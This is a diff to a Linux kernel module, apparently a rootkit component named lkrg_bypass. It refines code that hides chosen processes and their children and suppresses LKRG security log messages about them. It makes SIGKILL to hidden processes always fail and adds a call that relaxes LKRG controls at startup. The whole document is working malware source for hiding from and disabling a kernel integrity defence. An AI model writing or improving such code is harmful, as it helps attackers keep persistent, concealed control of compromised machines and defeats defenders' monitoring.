@@ -206,22 +206,27 @@ static notrace bool ptree_hidden(struct task_struct *task)
 {
     int depth = 0;
     struct task_struct *parent;
-    
+    bool found = false;
+
     if (!task) task = current;
     if (!task) return false;
-    
+
+    rcu_read_lock();
     while (task && depth < 64) {
         if (is_hidden_pid(task->pid) || is_hidden_pid(task->tgid) ||
-            is_child_pid(task->pid) || is_child_pid(task->tgid))
-            return true;
-        
-        parent = task->real_parent;
+            is_child_pid(task->pid) || is_child_pid(task->tgid)) {
+            found = true;
+            break;
+        }
+
+        parent = rcu_dereference(task->real_parent);
         if (!parent || parent == task || task->pid <= 1)
             break;
         task = parent;
         depth++;
     }
-    return false;
+    rcu_read_unlock();
+    return found;
 }
 
 static notrace bool should_hide_task(struct task_struct *task)
@@ -261,8 +266,7 @@ static notrace pid_t extract_pid_from_log(const char *msg)
 static notrace bool should_filter_log(const char *msg)
 {
     pid_t pid;
-    int i;
-    
+
     if (!msg || !strstr(msg, "LKRG")) return false;
     
     if (atomic_read(&umh_bypass_active) > 0) {
@@ -272,13 +276,9 @@ static notrace bool should_filter_log(const char *msg)
     }
     
     pid = extract_pid_from_log(msg);
-    if (pid > 0) {
-        for (i = 0; i < hidden_count && i < MAX_HIDDEN_PIDS; i++)
-            if (hidden_pids[i] == pid) return true;
-        for (i = 0; i < child_count && i < MAX_CHILD_PIDS; i++)
-            if (child_pids[i] == pid) return true;
-    }
-    
+    if (pid > 0 && (is_hidden_pid(pid) || is_child_pid(pid)))
+        return true;
+
     return false;
 }
 
@@ -317,7 +317,7 @@ static int (*orig_send_sig_info)(int sig, struct kernel_siginfo *info,
 static notrace int hook_send_sig_info(int sig, struct kernel_siginfo *info,
     struct task_struct *p)
 {
-    if (sig == SIGKILL && p && atomic_read(&umh_bypass_active) > 0) {
+    if (sig == SIGKILL && p) {
         if (is_hidden_pid(p->tgid) || is_child_pid(p->tgid) ||
             is_hidden_pid(p->pid)  || is_child_pid(p->pid))
             return 0;
@@ -501,6 +501,7 @@ notrace int lkrg_bypass_init(void)
     register_module_notifier(&module_notifier);
 
     try_install_hooks();
+    lkrg_relax_controls();
 
     return 0;
 }
